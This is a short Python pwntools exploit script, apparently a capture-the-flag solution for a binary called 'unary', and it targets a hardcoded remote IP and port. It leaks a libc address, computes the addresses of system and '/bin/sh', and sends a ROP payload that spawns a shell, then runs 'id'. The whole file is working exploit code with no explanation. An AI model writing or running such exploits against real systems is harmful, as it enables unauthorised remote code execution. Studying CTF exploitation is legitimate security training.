from pwn import * 
pop_rdi = 0x00000000004008d3
pop_rsi = 0x00000000004008d1
#p = process("./unary")
p = remote("66.172.27.144",9004)
p.sendline("68")
p.sendline("6295536")
p.recvuntil("x = ")
data = p.recvline().strip()
leak = u64(data.ljust(8,"\x00"))
base = leak - 0x0000000000021ab0
system = base + 0x000000000004f440
binsh = base + 0x1b3e9a
print "libc base: ",hex(base)
print "system: ",hex(system)
print "binsh: ",hex(binsh)
p.sendline("71")
p.sendline("4196630")
payload = ""
payload += "A"*44
payload += p64(pop_rsi)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
pause()
p.sendline(payload)
p.sendline("0")
p.sendline("id")
#gdb.attach(p)
#p.sendline(str((0x0000000000600E00-system)/8))
#p.sendline("1")
p.interactive()
